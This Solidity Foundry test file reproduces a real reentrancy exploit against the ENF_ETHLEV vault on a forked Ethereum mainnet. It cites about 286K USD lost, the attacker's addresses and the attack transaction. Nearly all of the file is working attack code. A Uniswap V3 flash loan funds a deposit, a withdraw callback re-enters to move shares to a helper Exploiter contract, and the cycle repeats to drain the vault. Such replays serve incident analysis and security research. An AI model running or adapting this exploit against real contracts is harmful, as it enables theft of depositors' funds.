// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~286K USD$
// Attacker : https://etherscan.io/address/0xee4b3dd20902fa3539706f25005fa51d3b7bdf1b
// Attack Contract : https://etherscan.io/address/0xfe141c32e36ba7601d128f0c39dedbe0f6abb983
// Vulnerable Contract : https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e
// Attack Tx : https://etherscan.io/tx/0x6e6e556a5685980317cb2afdb628ed4a845b3cbd1c98bdaffd0561cb2c4790fa

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x863e572b215fd67c855d973f870266cf827aea5e#code

// @Analysis
// Twitter Guy : https://twitter.com/Phalcon_xyz/status/1689182459269644288

interface IENF_ETHLEV is IERC20 {
    function deposit(uint256 assets, address receiver) external payable returns (uint256);

    function withdraw(uint256 assets, address receiver) external returns (uint256);

    function convertToAssets(uint256 shares) external view returns (uint256);

    function totalAssets() external view returns (uint256);
}

contract ContractTest is Test {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    Uni_Pair_V3 Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);
    address Controller = 0xE8688D014194fd5d7acC3c17477fD6db62aDdeE9;
    Exploiter exploiter;
    uint256 nonce;

    function setUp() public {
        vm.createSelectFork("mainnet", 17_875_885);
        vm.label(address(WETH), "WETH");
        vm.label(address(ENF_ETHLEV), "ENF_ETHLEV");
        vm.label(address(Pair), "Piar");
        exploiter = new Exploiter();
    }

    function testExploit() external {
        while (ENF_ETHLEV.totalAssets() > 1 ether) {
            deal(address(this), 0);

            Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));

            emit log_named_decimal_uint(
                "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
            );
        }
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        WETH.withdraw(WETH.balanceOf(address(this)));
        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);
        uint256 assets = ENF_ETHLEV.totalAssets();
        ENF_ETHLEV.deposit{value: assets}(assets, address(this)); // deposit eth, mint shares

        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
        ENF_ETHLEV.withdraw(assetsAmount, address(this)); // withdraw all assets, burn small shares by reentracny, re-enter point

        exploiter.withdraw(); // withdraw all assets

        WETH.deposit{value: address(this).balance}();
        uint256 amount = abi.decode(data, (uint256));
        WETH.transfer(address(Pair), amount1 + amount);
    }

    receive() external payable {
        if (msg.sender == Controller) {
            ENF_ETHLEV.transfer(address(exploiter), ENF_ETHLEV.balanceOf(address(this)) - 1);
            nonce++;
        }
    }
}

contract Exploiter {
    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);

    function withdraw() external {
        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint256).max);
        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
        ENF_ETHLEV.withdraw(assetsAmount, address(this));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}
